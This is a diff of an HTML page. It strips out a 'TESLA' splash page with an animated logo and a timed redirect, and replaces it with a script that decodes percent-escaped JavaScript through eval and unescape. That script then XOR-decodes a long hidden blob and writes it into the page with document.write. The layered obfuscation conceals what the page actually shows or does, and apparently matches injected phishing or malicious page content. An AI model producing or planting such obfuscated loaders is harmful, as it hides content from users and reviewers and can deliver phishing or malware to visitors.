@@ -1,73 +1,16 @@
-<!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TESLA</title>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
-    <style>
-        body {
-            margin: 0;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background-color: black;
-            font-family: 'Roboto', Arial, sans-serif;
-        }
-        .circle {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            width: 250px;
-            height: 250px;
-            border-radius: 50%;
-            background-color: black;
-            color: white;
-            font-size: 2.5rem;
-            text-align: center;
-            position: relative;
-            overflow: hidden;
-        }
-        .circle::before, .circle::after {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 60%;
-            height: 60%;
-            border-radius: 50%;
-            border: 10px solid red;
-            box-sizing: border-box;
-            transform: translate(-50%, -50%) scale(0);
-            animation: pulse 2s infinite;
-        }
-        .circle::after {
-            animation-delay: 1s;
-            border-color: white;
-        }
-        .red {
-            color: red;
-        }
-        @keyframes pulse {
-            0% {
-                transform: translate(-50%, -50%) scale(0);
-                opacity: 1;
-            }    
-            100% {
-                transform: translate(-50%, -50%) scale(2);
-                opacity: 0;
-            }
-        }
-    </style>
 </head>
 <body>
-    <div class="circle">T E S <span class="red">L A</span></div>
-    <script>
-        // Function to redirect after 10 seconds
-        setTimeout(function() {
-            window.location.href = 'https://example.com'; // Replace with your target URL
-        }, 10000); // 10000 milliseconds = 10 seconds
-    </script>
+
+<script type="text/javascript">
+<!-- 
+eval(unescape('%66%75%6e%63%74%69%6f%6e%20%75%39%36%35%36%35%66%35%37%39%32%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%32%32%39%35%30%39%30%33%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%36%39%33%34%38%35%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%35%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
+eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%75%39%36%35%36%35%66%35%37%39%32%28%27') + '%32%15%3a%4a%3f%4b%50%4d%49%18%67%67%6d%62%30%0d%05%36%67%6b%6e%6e%18%63%54%6c%67%31%18%60%68%19%3d%0e%0c%34%67%68%59%5a%30%0d%05%1a%1f%1f%1d%3e%6b%64%67%59%1e%57%66%5c%6c%6a%64%69%31%1e%54%47%44%2d%3a%18%39%09%01%1f%1d%12%18%33%60%65%6a%55%1e%63%6e%6b%6f%2e%69%6f%74%6c%74%3d%14%56%28%51%38%2c%38%63%6b%6f%54%6a%61%54%62%60%1c%1f%5a%6c%60%6c%64%61%6a%3d%14%41%40%39%64%5b%64%69%1e%3d%00%00%1e%12%1e%1b%36%6c%64%69%55%18%6d%54%6d%65%31%18%71%65%64%76%6d%63%6e%6b%15%1e%5b%63%6c%6f%61%6d%6b%3e%14%71%60%57%6a%66%31%5a%60%70%60%5a%66%21%71%60%57%6a%66%2e%1e%64%68%60%6b%62%55%64%2c%66%5b%59%6e%65%38%2d%2d%2f%1b%30%0b%01%13%1e%1e%12%32%6f%65%6b%63%66%30%d7%84%dc%86%d1%74%d6%b4%1a%d0%87%d2%8c%d0%a7%3f%2f%6a%6d%6a%67%61%3d%0c%03%12%18%1f%13%32%62%6d%6c%66%1a%69%64%61%31%1e%6a%67%71%62%69%6b%63%61%64%6b%1b%12%60%69%68%64%3d%14%6b%6f%75%63%64%68%20%5d%6a%66%18%3c%12%32%1c%29%2c%1f%d5%a5%d0%a7%db%b7%1e%dd%85%d4%7e%d0%78%1d%37%4d%4a%13%2d%2d%30%0d%05%36%2e%67%66%55%5c%3d%00%00%32%54%6f%5f%75%3d%0c%03%12%18%1f%13%32%66%25%3c%d4%81%d7%a8%d5%a1%d0%a7%dc%83%d6%ab%1e%d3%a2%d0%7a%d2%89%18%d0%74%d1%80%12%d1%80%d5%87%d0%7b%da%b7%d0%8d%19%32%23%66%2c%38%0c%01%1d%12%18%1f%3f%58%75%66%6a%6a%68%1f%60%59%31%1e%59%67%6c%18%30%d6%a2%d2%b5%d7%b3%da%b1%1f%dc%87%d1%88%d6%a2%36%2e%59%76%66%6c%6e%61%3c%0d%0c%0d%05%1a%1f%1f%1d%3e%6d%5a%65%61%6e%66%1e%6e%6c%5a%3c%1b%67%5d%69%6c%6e%6a%20%60%6e%1c%3d%33%2c%67%5d%69%6c%6e%6a%30%1e%37%1d%2c%2c%1d%da%af%d7%ab%d6%b7%12%d1%80%d5%7b%d0%7a%12%46%58%79%59%4b%57%68%64%6a%6b%1f%2e%21%3a%0c%0d%32%2f%54%6f%5f%75%3d%0c%03%3e%29%67%67%6d%62%3022950903%35%39%35%30%31%34%34' + unescape('%27%29%29%3b'));
+// -->
+</script>
+<noscript><i>Javascript required</i></noscript>
+
 </body>
 </html>
+
